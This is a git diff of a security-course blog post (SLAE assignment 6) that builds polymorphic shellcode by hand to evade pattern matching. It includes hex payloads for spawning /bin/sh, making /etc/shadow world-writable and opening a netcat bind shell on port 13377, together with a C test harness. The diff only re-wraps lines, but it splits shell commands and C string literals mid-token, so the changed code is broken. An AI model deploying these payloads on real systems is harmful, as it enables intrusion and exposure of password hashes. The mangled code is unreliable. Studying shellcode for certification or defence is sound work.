@@ -11,11 +11,14 @@ en: true
 
 These series of posts starting with the prefix "Assignment" will be created in order to fulfill the requirements of the SLAE certification. 
 
-According to wikipedia, "Polymorphic code is code that uses a polymorphic engine to mutate while keeping the original algorithm intact. That is, the code changes itself each time it runs, but the function of the code (its semantics) will not change at all. For example, 1+3 and 6-2 both achieve the same result while using different values and operations.". This could include as well garbage instructions which do not affect execution at all. Nevertheless, it helps to beat pattern matching.
+According to wikipedia, "Polymorphic code is code that uses a polymorphic engine to mutate while keeping the original algorithm intact. That is, the code changes itself each 
+time it runs, but the function of the code (its semantics) will not change at all. For example, 1+3 and 6-2 both achieve the same result while using different values and 
+operations.". This could include as well garbage instructions which do not affect execution at all. Nevertheless, it helps to beat pattern matching.
 
 Today we are going to dive a little deep within Polymorphic shellcode. However, instead of using an engine, we will generate it with our own hands! 
 
-The sixth assignment from the seven requires taking three [shellcodes](https://es.wikipedia.org/wiki/Shellcode) from [shell-storm.org](http://shell-storm.org/) and generate polymorphic versions of such. In addition, its size should not be bigger than 50%.
+The sixth assignment from the seven requires taking three [shellcodes](https://es.wikipedia.org/wiki/Shellcode) from [shell-storm.org](http://shell-storm.org/) and generate 
+polymorphic versions of such. In addition, its size should not be bigger than 50%.
 
 #### Execve Shellcode (Shellcode #1)
 
@@ -76,7 +79,8 @@ Let's dump the shellcode and test it!
 
 ```term
 root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# nasm -f elf32 1.asm -o 1.o && ld 1.o -o 1 
-root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 
+'s/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x9e\x31\xc0\x60\x50\xfc\xbe\x2e\x2f\x73\x68\x46\x99\xbf\x2e\x62\x69\x6e\x47\x56\xfd\x57\x89\xe3\xfc\xf5\xb0\x0b\xcd\x80"
 root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/1_shellcode#
 ```
@@ -177,7 +181,8 @@ Let's dump the shellcode and test it!
 
 ```term
 root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# nasm -f elf32 1.asm -o 1.o && ld 1.o -o 1 
-root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 
+'s/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x4d\x31\xc0\x99\x52\xb0\x0f\x9e\x68\x61\x64\x6f\x77\xfc\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x99\x89\xe3\x9c\x66\xb9\xff\x01\xf5\xcd\x80\x40\x60\xcd\x80"
 root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/2_shellcode#
 ```
@@ -255,7 +260,8 @@ mov al,11
 int 0x80
 ```
 
-Similarly to the techniques implemented within the previous shellcode, we will insert NOP equivalents which will difficult pattern matching. Nevertheless, these won't change execution at all!
+Similarly to the techniques implemented within the previous shellcode, we will insert NOP equivalents which will difficult pattern matching. Nevertheless, these won't change 
+execution at all!
 
 ###### Final code:
 
@@ -319,8 +325,10 @@ Let's dump the shellcode and test it!
 
 ```term
 root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# nasm -f elf32 1.asm -o 1.o && ld 1.o -o 1 
-root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-"\x9e\x90\xf5\x31\xc0\xf7\xe2\x50\x5a\x52\x58\x68\x33\x33\x37\x37\xfd\x68\x2d\x76\x70\x31\x89\xe2\x50\x68\x6e\x2f\x73\x68\xfd\x68\x65\x2f\x62\x69\x9e\x68\x2d\x6c\x76\x76\x89\xe1\x50\x68\x2f\x2f\x6e\x63\xf5\x68\x2f\x2f\x2f\x2f\x47\x46\x68\x2f\x62\x69\x6e\x89\xe3\x50\xfc\x52\x51\x90\x53\x99\x89\xe1\x56\x5f\x57\x5e\x5d\xb0\x0b\xcd\x80"
+root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# objdump -d ./1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 
+'s/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x9e\x90\xf5\x31\xc0\xf7\xe2\x50\x5a\x52\x58\x68\x33\x33\x37\x37\xfd\x68\x2d\x76\x70\x31\x89\xe2\x50\x68\x6e\x2f\x73\x68\xfd\x68\x65\x2f\x62\x69\x9e\x68\x2d\x6c\x76\x76\x89\xe1
+\x50\x68\x2f\x2f\x6e\x63\xf5\x68\x2f\x2f\x2f\x2f\x47\x46\x68\x2f\x62\x69\x6e\x89\xe3\x50\xfc\x52\x51\x90\x53\x99\x89\xe1\x56\x5f\x57\x5e\x5d\xb0\x0b\xcd\x80"
 root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode#
 ```
 
@@ -330,7 +338,8 @@ root@SLAE:/home/whitecr0wz/assembly/assignments/Assignment_6/3_shellcode# cat po
 #include<string.h>
 
 unsigned char code[] = \
-"\x9e\x90\xf5\x31\xc0\xf7\xe2\x50\x5a\x52\x58\x68\x33\x33\x37\x37\xfd\x68\x2d\x76\x70\x31\x89\xe2\x50\x68\x6e\x2f\x73\x68\xfd\x68\x65\x2f\x62\x69\x9e\x68\x2d\x6c\x76\x76\x89\xe1\x50\x68\x2f\x2f\x6e\x63\xf5\x68\x2f\x2f\x2f\x2f\x47\x46\x68\x2f\x62\x69\x6e\x89\xe3\x50\xfc\x52\x51\x90\x53\x99\x89\xe1\x56\x5f\x57\x5e\x5d\xb0\x0b\xcd\x80";
+"\x9e\x90\xf5\x31\xc0\xf7\xe2\x50\x5a\x52\x58\x68\x33\x33\x37\x37\xfd\x68\x2d\x76\x70\x31\x89\xe2\x50\x68\x6e\x2f\x73\x68\xfd\x68\x65\x2f\x62\x69\x9e\x68\x2d\x6c\x76\x76\x89\xe1
+\x50\x68\x2f\x2f\x6e\x63\xf5\x68\x2f\x2f\x2f\x2f\x47\x46\x68\x2f\x62\x69\x6e\x89\xe3\x50\xfc\x52\x51\x90\x53\x99\x89\xe1\x56\x5f\x57\x5e\x5d\xb0\x0b\xcd\x80";
 
 main()
 {
